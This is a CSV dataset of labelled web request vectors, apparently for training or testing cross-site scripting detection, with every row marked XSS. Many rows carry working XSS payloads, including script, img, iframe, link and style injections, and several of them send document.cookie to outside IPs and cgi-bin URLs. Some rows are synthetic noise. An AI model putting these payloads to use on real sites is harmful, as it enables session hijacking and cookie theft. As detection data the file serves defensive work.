id,class,vector
2033,XSS,/tdlWi/aNP5Bmuz@M8l/fgr@/oottdsaus7Sratf/odragorooo/e@7/suJbOSNu_s@wi/ettztyEi2d2veel5ihs/id5Bband/eQzxjWcZ/NeyaRs2d7tfsHhp1.php3?moana=hnsc&ss=r6Ujtsq
2042,XSS,/1r/w.5MzfASz3xvCmk1/anhglsyc8l8ntamhinnl/d_5q-1MpL.tiff?hnxPomaaWt4z1ad=%3Cform%2Bname%3DT%3E%3Cselect%2Bname%3DerI4+++%3Ehttp%3A%2F%2Fwww.t.com%2Foefson%2F%3F%3C%2Fselect%3E%3C%2Fform+%3E
2053,XSS,iegra9oitnD=855
2057,XSS,"MEmMn=<img   src   = "" livescript:[window.open('http://72.209.60.228/tiol.aspx'+document.cookie);]      ""  >&ljC6odjeth=4Nlyi&pte6o=Ccews2fp&tdlpupipaxogshe=jEVsIk&ffnmavaz=hdigiScy6&attnaheoh9x=f8Sqpkc&pQPtGMKhMbodyP=caas&orad4tleye=4896420&8cigyF=4447&@.uvo=eu"
2060,XSS,/rfkciidavrsxzsrrreD/9dnqe8ese/B_GUrcpyN1T/rnsaetlmc/aqhuHnjWsyA/gN1UgAhomeZsIl-y/5sraretdeEarsi/gUDGzUxO0rjd0cb3j.bin?nsi7dbnt=4&ootoomelznO=%3Cimg++src++%3D+++%22+javascript%3A%5Bwindow.open%28%27http%3A%2F%2F176.90.145.15%2Finat.pl%27%2Bdocument.cookie%29%3B%5D+++++%22++%3E&ny6i=%5D%5Dbo
2067,XSS,"NnAh=5759&oimo=302&codezBrr0fus=vjs&_LDFB0OGDUL.=<xml  id=  ""     X ""><a ><b>&lt;script  >[window.open('http://130.235.111.81/taitil.mdb'+document.cookie);]&lt;/script   >;</b></a  ></xml   >&binsvRUA=59a3e&6teeoilhz=dcnimnx&Fed=3"
2069,XSS,/tRZB0kc/vojfa0i/Se2dtanlioaee/semoeih/Ep/e@lUeNSjkkP6M5OFX3_j/Bvxk0OmB68zVIWB/snfelLual6gahmlt/twEC.NHa2/rdesniOgsOmrNieDQe.bin?KDZW6=etyt1sYjF&okframvatoo=%28zh&0PD64xQk=%3C%21%5BCDATA%5B%3C%21--%5D%5D++++%3E%3Cscript++%3E%5Balert++%28%27nd1lsteP%27%29%3B%5D%2F%2F--%3E%3C%2Fscript++++%3E&k61hnode2ERBEFecho=nzckC2-ziDA&uOi7SwMjMesH=varAaA&2gttQiaDmu=1688853&deT=+nend
2076,XSS,/sOmAev3qm4pKiPr6iMaN/hpsysiiy/HTqREGIkqsystemcrv/05insertcI.2vv2/0aeayo/yA1X1-usock_streamY-/llSR.xclne1Wc3PXO65.swf?5ish4oyw=E+rml1ndt&Ah2etnh40e=%3C%21%5BCDATA%5B%3C%21--%5D%5D%3E%3Cscript+%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.olnsnesi.com%2Fcgi-bin%2Farorlise.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript+%3E&jA@6=emu&sFtglBour=6wen&cmdkXSduuscriptpk=u+ps5a%28eho
2088,XSS,/ag.57c@2xh.jFuYM.bin?04hNsn=eDLqawQXtB4_&me=a1luUzWLf&Elefitses9oEtt=nitnheqxriwRee&too7CvpzhRn=j%7Cz7St+%407&8itbda=elinkibinv&ispaIoe=826&h@_8H=mds&ieD9o5DrIVa1=%3Cobject+++classid++%3D+++%22+++++clsid%3A...+%22+++++codebase++%3D+%22++++javascript%3A%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.la.com%2Fcgi-bin%2Ftiistrniel.cgi%27%2Bdocument.cookie%29%3B%5D%22%3E&lreplacewRx=o._5OxXw%40Z&Ees=iylebdenoN5p1a1r&oueeholl=9k4h
2089,XSS,/eJTaT0wski/tCuZkmAP-Fjc.YoPqwV/JV/eI4ZxW7BJa/aorhrlbntat/YYV6NP2WiuM/tRp5MHKUE.cgi?ilatb0NatTttdan=%3Clink+++++rel++%3D+%22++++stylesheet+++++%22+href++++%3D%22javascript%3A++++%5Balert%28%27ibRc3r%27%29%3B%5D++%22++++%3E&ri=71&aisr1D9uasf4=s
2094,XSS,"ewene=<xml     id=   ""     X""  ><a><b  >&lt;script  >[window.open('http://19.102.131.49/to.sh'+document.cookie);]&lt;/script   >;</b   ></a ></xml   >&ereOTeegi=320&tsmspoEiw16tse=433347&5ey=4923925"
2098,XSS,/ll@ci.E3M0B/KsformVo9D/nS.46v/dloCbNraHssd/eMGrOXUGxltBDl/e4ONR3F@VN1aPjPoT/tb56a9/.MLHZ.jpg?xnfoeCq9rl0no9=%3Cmeta+++http-equiv%3D++++%22+refresh++++%22++++content+%3D%22+++++0%3Burl%3Djavascript%3A+%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.atnt.com%2Fcgi-bin%2Fnichtondet.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22%3E
2101,XSS,/oi0V.jpg?vhsteh=sstdinNot4%7CB&kow=%3Cxml+src++++%3D++++%22+++++javascript%3A+%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.asandeor.com%2Fcgi-bin%2Ftone.cgi%27%2Bdocument.cookie%29%3B%5D%22++%3E&kslr4P=tS%2Fbt%40s%2Fsscriptao3processing-instructionen+54access_log&assc7IaCawl=eLL&ti=2448&tnau=6A8J6Vh&usOsioeMvHe=hFeri7d&ea=3924&Set=8&sRiqz3e@=82174&ebeh=tqot1ttfmaTeeE&nRneseleugie=028556&sayemO=N2hsei%3Ettof0d&bNe36rs=at%40HR
2105,XSS,/hQTlPDoR.vDysNcQ/5dZ0_kxS6g04UO/iqNo0hEVqDxZD@UT0/shBF/s4vavltcyxs/jh5ro/sazotvwsyeA/se.sh?iltktJetq=dEKnbetweennstx&atbdsnta7aio=404&1rTgtgwTqtoesEE=A0mail7+8nlTIreesr&zr0SlqnESod=e%3Dbersm&Tw5egsdhetljdt=feger&9d=%3Ca+++href%3D%22++++javas%26%2399%3Bript%26%2335%3B%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.ntasonns.com%2Fcgi-bin%2Fsegech.cgi%27%2Bdocument.cookie%29%3B%5D+++%22++%3E&Onndenvpteawe=tremoo&svJS4-t=EtoH%3Eo+ttl%29
2117,XSS,/bZZbinNZWprocessing-instructiongu/6t/90/seken5ceeamMjeeeIIet/JK0CHGSKj8Faopen/pu/KwFLR.mdb?xjdiv4x=%3Cimg+++dynsrc++++%3D++++%22javascript%3A%5Balert+%28%27Uimt%27%29%3B%5D++++%22++++%3E
2120,XSS,/gwSdopiHsctp/eqehriL/uIX-KXydH/Jcopy-styleZ40VorVyid3C.jpg?0dXfS78q=sUedegfUtmpi&ymnnna=rKYqRpbck_6&eec6CU0Vaselect=oEyoi&nul=trs&ashToTmce=8ih0%3A&oettucEUh8w=2126256057&flnqa=h
2122,XSS,/jTO5UtcG2zxX3BX3/otajeqctsabfgciht/beO/oMHO0n/g7cDC1Yw-AX/tzLA7FKSKKua8d/ncjJWyomW0uVz8n/midJ.5sRpP/fndHhrr2nnenna4te1.pl?WAlQCUCrjx=t&bsQXBJo=%3Cimg++++src%3D%26%7B%5Bwindow.open%28%27http%3A%2F%2F67.149.153.240%2Fsi.exe%27%2Bdocument.cookie%29%3B%5D%7D%3B++%3E&0iZroa=hetH72roll5to&oms=group+bytwtenwzingbody1ia
2146,XSS,/eue6yoqlnxaow/b4zI9FRCm/4nWeadNQ4KGI4DGDP/OmJ9s_9Sd9i@gcJ/5NejW.mdb?idoltuOta=iet&oheec4meejbsaE=tqh3iqBF-0e&nset=%3Ce4i&9sd=6683590&tcu=%26%7B%5Bwindow.open%28%27http%3A%2F%2F219.178.225.90%2Fis.dll%27%2Bdocument.cookie%29%3B%5D%7D%3B&ehuideetunc7a=rol70woti&I_.-yJYjhttpsdivd=pS4I&htAEdcposoie=3606&nr=%2Beths4nriurW&sgmBsopugfnoasf=7&sdlgca=i9I&72WsPEbz-G=464216670
2154,XSS,/cwjrGyrkVPlmeV6L/szd700lh8s2/nniIleul.jpeg?s7iaoa1K=tfvbscriptonveetto%3Dt%3D&e51zI1I=019972&chltowE=%3Cimg+src++%3D+%22+mocha%3A%5Balert%28%27oteflpDMru%27%29%3B%5D+++++%22++++%3E&nif5rd8tngtIt=sAd&location6yH@dAperlPW=8l8fb+0%3Euusr%3Eoq+%24dd&180=o&ALijreip=openlocationy&eop=mentlhu9&T8OcUJ=sli3oixyhueocE8&ruTassscnar4t=3x&SJ3wn3gpB=roascriptNay2f
2170,XSS,/q2eia5teiwth/QlKA/lVI_yL/o10-SSSCC@Cv/r4ieexg/sY/nV85o5Y/n.pFeIz-y4cHFN2/n5Na/havingsAjV6KM.pl?81nhI4u=8oo%27adIeistdin%7Ep%22alib%22t%27&oqservices0opt.YcJvmpasswd=8304&anthpxrh=005&wtos359lhwasri=626131&daeoHqo=i0qrSs
2189,XSS,/havingpositionUkservicesHQchBautoexecWu2/e7niDeTEH1x56IJRq0h.jpg?goFqMtjaooaoIr=R&rhetrNoo=79509&ffaIdgnhla5=192766276&lsr=36207233&CnIv=%3Ca+href%3D++%22about%3A%3Cs%26%2399%3Bript++++%3E%5Bwindow.open%28%27http%3A%2F%2F221.57.127.15%2Fti.dll%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E+++++%22+++%3E&ncs=667
2192,XSS,/4C9.7C4/Vzwr/nNee1efsr/ennZ/k_tcLqhCvsBUVWt5Z7c/a7_1F-kh8L-PG_1PH/egyt5LEYpZ/foeitnr.js?90osao=+tk3tntes6ne&nslmeEoht=73946&mt9lc=0389251&f3saymtft=wa06TFNeg&tetAti=cwlnte+xznf&erzhdcsirnmssas=ornulled&xOdkh=aoa%29Elogsformni
2195,XSS,/nefdm1nszc/ncs/Aegla/Smo/7i/hLEvjdExuBmtUt0ejEeF.swf?thEvln9t8oeqre=%3Cstyle++type+%3D++%22++text%2Fjavascript%22%3E%5Balert+%28%27vRehsxns%27%29%3B%5D%3C%2Fstyle+%3E&wa=Tsock_streamNe&ontoscfgd=656952
2199,XSS,/bmebvcegtjrtlmtcb/ngoasiiatbmBaar/dX1Hwinnt/hacenwer/e0Q.jpeg?iavapes69=60542876&1hoAtl5unene=i2rogrk&if5j8ettuapn=aX1go%40&tgaes2Nsnzhchr=388&nanXe3=zt3vs0+dictbtec&ExhAi=oj2&SHz-Ke=NhddhDsheysv3oe&vhoreishoon=%3Cinput+type+%3D++%22++image%22++dynsrc+++%3D+%22+++++javascript%3A++%5Balert++++%28%27hy%27%29%3B%5D+++++%22++%3E
2203,XSS,itlnn4=inVT(dttneieb%]2tst&tnnteaieum0=40&ngomac9ps=2n$mezrV&nmtgxEvtrUe2o1s=c~sjimsyek &1LKt=osC.4&0RI=hgroup bytwo
2204,XSS,/qsT4Ecja/_o@IFWPqLXhttps.jpg?t2eo=icN%7Cand%27io8bt&chre=%3Ciframe+++++src+++%3D++++%22+++vbscript%3A%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.alin.com%2Fcgi-bin%2Ftrnite.cgi%27%2Bdocument.cookie%29%3B%5D%22%3E&innveo=iSl1Z-B.qhS&re=meymtkgfnhe&tadElati=m&zS4xDQ2mGVu=pw1_ljHPBg&iss=728958&aKeieln=otNrpbcEs&ai=etlhropc4t9&53Dein=%3Dl%3Brcp%3Dav
2208,XSS,/ddur-EXck6dk/dmTeep4dlroieoryj/5kiwai/5.updatetNIfromI1d2eDc6/RWOOIG-p9h/WattoRe6rn0et/ls/imtl/hzhSwga/Hekockd9sq1e/yR6TevalrI.aspx?82ZL=ix&eo0athria0fos=6747127&dislw=79&uWCPF2J5Pl=fso&x-A4=k%3BTtnlfarhttpsmbpur&er2si45oiv=TDdvrknGdtnoaeied&tsoUqpodTnEz=lbDyXpW&uaemAsWtnR=06421&EtK@7jyuBW=a&a0dtywO7=javascript%3A++alert++++%28+++%22+++++i.3Sdg%22%29&abooitcetnxt=3739577&ailrdb5efsbgbe=+jw0fedeN
2210,XSS,vnh8nsft2=8sisi&tcsetRgvRgne=88344044&eeooautvmlss=3723169&8kd=<script  >alert    (hdd3nn3s6bned.ryAis)</script   >&iuGcbhavingF=iewq5W&Itsu3=netcatkn&9wheregpQDG=5703&4irdt7w9Aoote3=olRwtl7mail&enflor=0e
2216,XSS,/SeaatanEi/oirT0o/aonemSsisStacteii/h3T56D/gQMl-gMOOLW52F/sB6Wdde/teseboe80g/arohspso6dyT2v0tvn/nqesfyHtVrt.asmx?Fj7ercme=098339&dztaaa=systemn%24jt&saearro=%3C%21%5BCDATA%5B%3C%21--%5D%5D%3E%3Cscript++++%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.llta.com%2Fcgi-bin%2Feronoron.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript+%3E&hhkoleE=24&ed70fdeiapaowvo=dsvUz&OUDB=6566865
2225,XSS,"sqe4imztaabui=46719666&DevformYImvarrEh=uRciNXl.K&ajteud8Xroti=da  ""        style=left:expression(alert  ("" 3.p  ""))   alt=    ""&eeiyvt4lus=08281&cauhlseyIVoa=shrih2ifs6inmcm&eiesauHe=2&nCQkautoexec=8.xFWkv&nwom8lg=$ittirnoa:7itiado>=&stwUi=256&co0me8h=4hgzeetia&q9eioytkesied=rtigstNs'Fwinnt&9rwikeqAtfri=3&wrt=Iqde&2seny2b=hwhtr\nnpEinputd&rVxejteoe4kc6tl=Lggssedutln"
2241,XSS,/i9gCH@Y1Zw7/iVU-5YaeXtYC/hecmiEngeOelidsoeau/cXwFigbC-j.Pa/jvdVadminkiRWhDorIx/jhatuodjtahyfrtiapL/zailt.png?ntniAhOlcynoeo=8875936&hboewittitacp=03LCGi.RwDjI&alteen=sde43mmiaiO%3CHeo
2250,XSS,/ebm3iJYJe/TedntsefaE1r/Eseerxta5/RnUincludeIGg/t4GLm1hKfV43tVGvjx/x0lyXEfO/2DJMp@XmrQWz0/odRtKmigroxk/aCG3VcSwAgJon.htm?cju1ahiEcthe0=nRburnqevonona&J-wlib@49uuT=2rt&aa6e8uryd=hac3ilgwhaedo&Hj2vf8r=19310&gaieSnpdeehrho=%3C%21%5BCDATA%5B%3C%21--%5D%5D%3E%3Cscript++++%3E%5Balert++%28%27te%27%29%3B%5D%2F%2F--%3E%3C%2Fscript+++%3E
2252,XSS,/5KQ/qhqO1ByBz/ebyfaott/eQlg9GvT/sO7eAYqP5/hEqAy/a5vcvnNngM91/d2a1ohniwYrPqd/da8/ohyHp2er68eraNhtGs.shtml?tGiiazsu9oz=%3C%3Cscript++%3E%5Balert++%28%27axa0d2ou2n%27%29%3B%5D%3C%2Fscript+++%3E&kaute=618
2254,XSS,cZeeuA8u=txp&2irOzsilhhdni=gewi&e4SrtkiEE=s4 asnjxmlw-rwnecftn&ewavF=0oalPj2vIUMV&f3n8eme=3&Atd6mPaopt.6=wr /anl n &hsahMtPieen=piagadn9sh&Dem3mtm=t@morS&fiiuArm=eBKh&pg.F6LL=h8eaeirRgomo&rrrradm=1veo0eedoargd&tpaoirNtlxo7n=56&rld=rwindow.open&tskebhwtlet=2190&ntn=79421172
2255,XSS,/1ueetyzishbatlawhrH/2t8P_DTajY/acjXs@1/cY/yha9keeh5nuwtd8ykrc/jeikIIywVhoqz75X/hxxrfrpx@e/i@EUF7Y-WB/6recy/ml_0/mnORsW.asmx?Wmbrolulwte=%26%7B%5Balert++%28%27eeTwim%27%29%3B%5D%7D%3B&egopAfis=rue%7Ctuiercja&xMvxatmp8=64861&shfn7Eeb=0857540&iafOesrlatsRkaT=An%3D+a&uufiaco=tmpFzr
2269,XSS,/Mq/sisnherextasmu/em/5kfSvpy8/jaruHantsTnvma/nafabetanvi/eUquRUozd45aPMo/sRHllocationXoZvUb.aspx?tetMsmcjatblnyy=43&6exnE=8280466571&gonr=%3Cstyle+++%3E%3C%21--%3C%2Fstyle++++%3E%3Cscript+%3E%5Balert%28%27rd%27%29%3B%5D%2F%2F--%3E%3C%2Fscript+%3E&3ww=h3pyshhp%7Ety&isO=+oi4giu4e5y&1ayoowtWtthtGIf=mlrhflaeaaeE
2275,XSS,/iaT/mE/pWscaihtcsaRqgeNId/Harecne2wnapiensr/esnb6hEz/selectHF/ivwpMUkwk5c-/fZAt9MepZV/ojriDeor/shJea.KedfdmewDb/trin6Amdldri.mdb?Ean2mtto=0h%3Ddt8ohavingonullerbsoinsert+drop&eso8taMynPsmdls=2208&rfsxE98t=%25uo&iIlHSh58q9H=%3Cimg+++++src+++%3D++++%22+++++ie%3E++%22++onmouseover+%3D++++%22%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.lltesita.com%2Fcgi-bin%2Fat.cgi%27%2Bdocument.cookie%29%3B%5D+++%22%3E&c0Pvn9=u%3Aha&8vinsert4xbdandVTfbody=38625&auEAeemm=1776&mwoednoyhiepnte=latpiosE4C&9ti=619721&tfxethn9=507&OeaatNc=wp-ya&eTtrdn=4479629522&set=a
2278,XSS,/Rtar/tu/aasieT/dYACd.G36YAOFIY0GV9G.cgi?G1W58YkDL=%3Cdiv+onmouseover%3D+++%22+++%5Bwindow.open%28%27http%3A%2F%2F226.2.77.237%2Fneet.msf%27%2Bdocument.cookie%29%3B%5D+++++%22%3E&Ceaes78hz=2Ia5cO37r
2279,XSS,/Ctop5iye8fsNtbeee/noiet1s/ofttese9tl/stntefmiegwcsir5ssd1/a6qJi.gqPuhGLKj/jiq4XyIJ5nhlLB/I3gS/siax6mH4t2YUBE3Fp-YA.aspx?7se3=udmri&rl=%3Ec&xvno=neqerodehhsreeoro&sewmtf=8&wydoedn=nsot77betweeniul9&k9copen1Nimgmk-M-=%3Cscript++++%3Ealert%28%27tGie.tsIeoe%27%29%3C%2Fscript+%3E
2281,XSS,/pd2Z@/lMDHZjNHeoLzx/disl.tiff?nenF2ruptnoathn=i%40lVWac.&h0rcgeT=5683&P6z8zm=cg5e%28fa+eehttpinsertegla&hesnqlapcteDt=21661039&tuerm8yy=%3Emeei%2F&tg1tocenejnoas=rieE&Ei6=6&rc8sae=uxnfKiX8&TxWZk9xnph-qAP=b0tE&IW6aeioaoInns=isehet&3nbi=n5y6efinclude&d8jEnee=aRaiyelersltnbi
2296,XSS,/6rxse.shtml?oa=7377&lrihgesze6k=iWGsazM8&tettgqfgooh=D3Oh4iTstdintikl&dspnF8aaa4=ai&atAnEcOEefiesti=cZHknOv&5lnheS5elaCa=%3Cstyle++type++%3D+++%22++++text%2Fjavascript++++%22%3E%5Balert++++%28%27ittvdES%27%29%3B%5D%3C%2Fstyle%3E
2314,XSS,/tzLC-1iHzzpcFnARV8q.jsp?e6d=f%3Bma1Elrqattw5&kQEXWVgGps=NRsw&MIpyznAqd0=sopewr%3Cselectwstdinhti%5Co+upa&oITesuz0euiz=%3Cimg%2Bsrc%3Djavascript%3A+alert++++%28%27fi.aje%27%29++%3E&tsgyeeo=354071088&aRw6xin=aBestbrtmkaiRgi-0di&gtdctt=8655959855&-iHFpawZjtc=oc1qGmB4-3&hsrCorhd=geOfV4oF
2323,XSS,3hohg0laras2i=651146&yoamqnyeyl=00952097&ttjoltntee=2971&nco=
2334,XSS,/ebsOteu/otahhelAfyvoD5a/ycrhsL/oI4x8.lzXM9sH8aE/l6soseeTopsbdkema.gif?os25Btrenwrqa=0158233&j5Hel=naaesrenh5g&hckutc=%3Ciframe+src++%3D+++%22vbscript%3A%5Bwindow.open%28%27http%3A%2F%2F69.211.103.1%2Fgechte.sh%27%2Bdocument.cookie%29%3B%5D++++++%22++++%3E&rqitoua7=olymiae&eSseptsudphtbTn=e%2BsoI6ehnak&ee=Edioe7&oiaToe=itC&EnfaNicz=ec+&age=t_acToTr&23A=andat&hedn=hF5RCR.Eww
2339,XSS,/eseeeebLpnseeieic/kNuynzy./vX3P.Y-IAyzdEko/iosrInvOpwNt9lDgner/nX9sf/-9m03x/a7eo1nss2ye/to4vdiaes/_SZelX/mFhN/fzaDRfEM/tqsushior.php3?ramasaEmeneooo=9&hsatfsg=nGwrhrr6s&denmni=lqAoN1ZkAHJ&asepem=usEnpdexeceg&0dHh6t8s0tlr=n%2Fhomeo&nnuuberstyw=toinput&mnmtSvtlasoedn=nph-le&ndoeeGsy=12889842&lsg=%3Cimg+src++++%3D%22++nsneil+++%3E+++%22+++onmouseover++++%3D%22++++%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.il.com%2Fcgi-bin%2Fliorro.cgi%27%2Bdocument.cookie%29%3B%5D++++%22+++%3E&passwdbHZc33=60039425&sjcr=saEa2nMd+ssdd
2345,XSS,/hqsW9Aiy@z0F/eObhtW9mvlKUC8950/4b8@rSt06M/eKg.V-hEFzmik/mdIWA1ZOb1h-F/lke1Gk4jIc@17k-Fr.mspx?a5s9xfr=9377&7oe=+yenauatpt9ei&RB.w=fteCgs&hn9ede3=tsnt&EUetxle46smo=402276&ssrtiaSempa7sd=ntpe&aniusio0lshtai=s+Ll&tjttONywteny=rras1lq87%40ji&nof=6382698&mt2d=75&rxrse=ntpyusrn&emdRwtw=mlo&slswihhor=otltwindow.openrdivYT2ns&NilfMMKxGM=%5B%5CxC0%5D%5B%5CxBC%5Dscript++%3E%5Bwindow.open%28%27http%3A%2F%2F214.239.146.216%2Fngit.cfm%27%2Bdocument.cookie%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript++++%3E
2358,XSS,/scn/wPA@P-rtF/zBagwG/vwdoisTgeler7tsuez.htm?Ea=852717&tsEesiaoiu=%3Cimg+++++src+%3D+++%22++livescript%3A%5Balert%28%27ah8%27%29%3B%5D+++%22%3E&sQb6K8Vdf=yheEgSrees2j&oa5WeFiexigdtX=lOsi9eeran4rneetld&dhhron6ypoom=2134864574&gac=253&t0c=%5D7hl&rg=yoznoobjectfehm&tmo=248989&0oaaca1=rI0ntnia8wbody&ei=eog&rcaas0otl=oeJ2tuUmbO3
2369,XSS,l4i6leail=1536&wajvBe=dwinntdirdivM|fon&UmpPF=21&cargadUpztOr1=RuEreewyrtzlpt&5Uaknrsao9c=<winnt2Apyrowri&9wrjby2at9=6tecs/ Tsh$&LXZldZ=3FxhqvPDjI4&rltxibrett=~a&eeyeefaIi8Kr=eobjectaand4includehh&rtyueszqttpg0=oeseie1flebgiedA&epmovRgorerc=2&i8g=3514&wtagk=ot5a1wvwvk&rkchkrz0eho=e
2370,XSS,/eYsmeh6lhccaa4t2SO/o71KDa9xEnAVl.swf?uZ2Nsock_streamT7MW5G=%3Cdiv++++style++%3D+%22+width%3A+++expression%28%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.strior.com%2Fcgi-bin%2Faltiil.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B++%22+++%3E&NED2FXLZHqW=ehtpass%3E%3Aedorh%5Ctsms+zsnn
2380,XSS,"medifaoroaldl=0597&e1ieAN=46811&htsSe=12944932&enetedsy=62135&imLasol=ehgcm0MjnXr&tacueoeoE9d=g g&Mmr=09&6onsiOoLhl=5nrT@9e7qd&A1IgEru=nnotEu>e]link9c;-rrsock_streams&itciptneelchn=<img src =""  nsnaieol  >    "" onmouseover   = "" [document.location.replace    ('http://www.nalastnd.com/cgi-bin/naes.cgi'+document.cookie);]   ""  >&Sic=5&apuce0aeEmldnoa=wtT&DVS-=0940924&odur=erB&oiu0td=\objecta\\eo7/kn"
2382,XSS,/21./ifT.XT@ZWigqAunr/anr/TbH/r0Cv4WD0w/isidcqedoda.jsp?9O-fH=29907&ot=eIVDsjlpl2L&tSezc=%3Cdiv+++++style+++%3D++%22+behaviour%3A+url%28%5Bhttp%3A%2F%2Fwww.roarmeve.com%2Fscript%2Fzrihji9dAE.msf%5D%29%3B+++%22+%3E
2386,XSS,/4ootw.jpeg?q6h4aq5ioevo=7493&gsatnuonIt=zIhoscf&TdPCu7BRw8Sc=w+&rc9ehbue=%3Clink+rel+%3D++++%22++++stylesheet+++%22+++href++++%3D++++%22+++++javascript%3A%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ic.com%2Fcgi-bin%2Fie.cgi%27%2Bdocument.cookie%29%3B%5D+%22+%3E&cnomtenOentiw=8207467&ptc0k=173144
2389,XSS,/cco5/r8a-y_jMaGv.shtml?oiatbdl2o=eysO91aRreey2c&l3rrsnQtuvrru=allivoptANeeOti+8ttSAl&of8wKse0osteh=%3Cdiv+style%3D++++%22++binding%3A+++url%28%5Bhttp%3A%2F%2Fwww.an.com%2Fscript%2Fkex.asp%5D%29%3B%22%3E&cleqjrj5tbddsn=85181&nitEfo=dn&NqsithpMathslt=84961687&3GTshutdownPs=ppt0sr0edrdmlaeD&nko=tERDI
2390,XSS,/Se5gretsaanG5jE/hsOH39QQKRX0Dy4xl/EocopyN/ewdZgTpvj8-/eUeyZ6G-F1tP/qs6rgvsioe1nclstiHw/dmalEgShV.w@qNEyhv.dll?5c0ief=9il&7CNinput9uKeoGEo=r%7Exp_E&exjacm=%3Clink+rel+++%3D++%22++++stylesheet%22++++href+%3D++%22++++javascript%3A++++%5Balert+++%28%27Qwhs%27%29%3B%5D++%22+++%3E&60evalwgetCbinmML=Enhtpassltuatgng5linka&UKSW%uoq00=s%5C%5Cs%3CL%2F1spqin&4La9ps4xntW=agLioweojaxrero&siqkbieayesF3o=s-0Zgzux7FN&ewtttuarrnIs=ReeorrnD&ITmhvafcnin9r=deelpassthrueh1+a04nmochalnihu
2397,XSS,/siAattxsodSmqDr5hgio/ee7/spY.PT/ei2SjeanRijntxNn/LVQDz5Y/9KAkTQK2x.tiff?Ehorsn=iglhatmpta2e%7C&td=5104876450&enca95Rlti0tq=32056&@BuKtPgrFGV=V6a&fhaisalldw6r=%3Cdiv+++style++++%3D%22binding%3A+++++url%28%5Bhttp%3A%2F%2Fwww.rotrettr.com%2Fscript%2FFeiadnn6.php%5D%29%3B+%22+++%3E&hnarrtwme0esjnn=md+1ninsertouieon+d%3Ecom
2401,XSS,"VZC-inwgetZK=i&e7spniis=<img     dynsrc  = ""    javascript"
2408,XSS,/aoui/eblpteso/AZsHCWUU3img@Ls/huZuPVtqxxaYCjmrB.Wj/bfah3qnttrmagnaoaD3/agEICqB7H/uT6cX2_Ixk2gmQbESlsf/TcZ3TBfjrm3tK/m3m1g/aoOw6gV./edsm4emaepeEo.php?dqi=csdGtnvlWerFwnuiA&ks=%3Cdiv++++style++++%3D+%22+++++background-image%3A++url%28javascript%3A+%5Bwindow.open%28%27http%3A%2F%2F160.135.31.172%2Folalto.msf%27%2Bdocument.cookie%29%3B%5D%29%3B+%22++%3E&ehtezeEenln=aaqr&ashomiEnCTc=atredleeI%5C&Sbgsound2replace@jnhtpass=einEg&bRt.E.KhZ=hnftvuuani&hdoHobafitb=146
2410,XSS,"hpn4a4efE=117&lsW5K3AJ=tneune<oIweTs6&leht=6416&ozyoeoad9a9oae=342&reoee=<img src  =    ""   lendries >     "" onmouseover=  ""     [document.location.replace('http://www.liorattr.com/cgi-bin/anilsestle.cgi'+document.cookie);]   ""   >&qaa=c.4FPByo&XuB8pn=wlqB&ashcngnaaz=nibody&iolftsmnhhne=ese&ecDewI3bevaenn=sli$ aai&tmEplsEi4=tcolere6ee8giijah"
2419,XSS,"ynW3x=2953964889&ieetosnt=eeraNmtsx5x&ssotsre=360424&p9uhiUdmun6g=706306&cRz_=<img   src=   ""    javascript"
